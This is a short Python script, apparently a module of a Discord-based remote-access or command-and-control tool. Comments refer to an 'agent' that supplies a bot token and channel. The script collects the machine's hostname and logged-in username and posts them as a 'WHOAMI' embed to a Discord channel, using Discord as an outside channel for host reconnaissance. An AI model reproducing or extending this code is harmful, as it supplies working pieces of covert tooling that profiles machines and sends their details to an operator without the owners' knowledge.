import argparse
import os
import platform

import discord


def main():
    parser = argparse.ArgumentParser()
    # required data given by the agent
    parser.add_argument("--token", required=True)
    parser.add_argument("--channel", required=True)
    parser.add_argument("--server", required=True)

    args = parser.parse_args()

    # grabs hostname and username
    hostname = platform.node()
    username = os.getlogin()

    # sets up discord bot
    intents = discord.Intents.default()
    client = discord.Client(intents=intents)

    # sends embed to the agent channel
    @client.event
    async def on_ready():
        channel = client.get_channel(int(args.channel))

        if channel:
            embed = discord.Embed(
                title="WHOAMI",
                description=f"`{username}`",
            )

            embed.add_field(
                name="Machine",
                value=f"`{hostname}`",
                inline=True
            )

            await channel.send(embed=embed)

        await client.close()

    client.run(args.token)


if __name__ == "__main__":
    main()